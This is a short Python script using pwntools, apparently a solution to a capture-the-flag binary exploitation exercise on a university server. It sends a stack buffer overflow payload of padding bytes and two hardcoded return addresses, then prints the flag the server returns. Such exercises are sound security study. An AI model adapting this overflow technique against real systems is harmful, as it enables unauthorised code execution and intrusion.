from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22155

## run a remote process
s = remote(SERVER, PORT, timeout=9999)

first_address = p32(0x0804a001)
second_address = p32(0x080487d9)
s.recvline()
s.sendline(b'A'*36+first_address+b'A'*4+second_address)
flag = s.recvall()
print(flag)



